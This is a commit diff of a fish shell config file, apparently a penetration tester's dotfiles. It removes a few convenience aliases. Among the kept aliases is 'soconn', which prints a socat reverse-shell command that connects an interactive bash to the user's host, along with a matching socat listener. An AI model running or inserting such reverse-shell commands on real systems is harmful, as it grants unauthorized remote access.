5a238402d98cabeda14d522c9b393f9aed81a123
cinerieus <cinereus@protonmail.com>
2023-02-26 14:41:21 +0000

    Update config.fish

--- config.fish
+++ config.fish
@@ -2,11 +2,8 @@ alias px='proxychains -q'
 alias ls='ls --color=auto'
 alias ll='ls --color=auto -lah'
 alias copy='rsync -ah --info=progress2'
-alias cls='clear'
 alias solisten='socat file:`tty`,raw,echo=0 tcp-listen:$LPORT'
 alias soconn='echo "socat exec:\"bash -li\",pty,stderr,setsid,sigint,sane tcp:[(hostname -i)]:$LPORT"'
-alias nv='nvim'
-alias gostatic="go build --ldflags '-s -w -linkmode external -extldflags "-static"'"
 
 set PATH ~/.local/bin $PATH
 #set -x CC /usr/bin/musl-gcc
